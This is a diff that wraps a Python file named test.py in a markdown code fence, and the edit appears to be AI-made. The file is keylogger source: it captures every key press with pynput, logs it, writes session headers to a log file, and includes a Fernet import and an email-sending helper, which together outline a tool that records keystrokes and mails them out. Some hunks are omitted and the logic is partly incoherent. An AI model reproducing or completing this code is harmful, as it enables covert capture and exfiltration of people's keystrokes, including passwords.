@@ -1,3 +1,6 @@
+Here's the content of the file `test.py` formatted with triple backticks and Python syntax highlighting:
+
+```python
 import os
 import sys
 import time
@@ -6,14 +9,17 @@ import configparser
 import logging
 from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
+
 # Setup logging
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 logger = logging.getLogger(__name__)
+
 # Configuration management
 CONFIG_FILE = 'config.ini'
+
 def load_config():
     """Load and validate configuration from file."""
     config = configparser.ConfigParser()
@@ -44,6 +50,7 @@ def load_config():
     except Exception as e:
         logger.error(f"Failed to load configuration: {e}")
         sys.exit(1)
+
 def setup_directories(log_dir):
     """Ensure required directories exist with proper permissions."""
     try:
@@ -53,6 +60,7 @@ def setup_directories(log_dir):
     except Exception as e:
         logger.error(f"Failed to create directory {log_dir}: {e}")
         sys.exit(1)
+
 def send_email(config, subject, body):
     """Send an email with the given subject and body."""
     try:
@@ -74,12 +82,14 @@ def send_email(config, subject, body):
             logger.info("Email sent successfully")
     except Exception as e:
         logger.error(f"Failed to send email: {e}")
+
 def on_press(key):
     """Handle key press events."""
     try:
         logger.info(f"Key pressed: {key}")
     except Exception as e:
         logger.error(f"Error handling key press: {e}")
+
 def start_keylogger(log_file):
     """Start monitoring keyboard input."""
     setup_directories(os.path.dirname(log_file))
@@ -87,7 +97,9 @@ def start_keylogger(log_file):
         f.write(f"\n\n--- New Session {time.ctime()} ---\n\n")
     with Listener(on_press=on_press) as listener:
         listener.join()
+
 if __name__ == "__main__":
     config = load_config()
     # Example usage
     send_email(config, "Test Subject", "This is a test email body")
+```
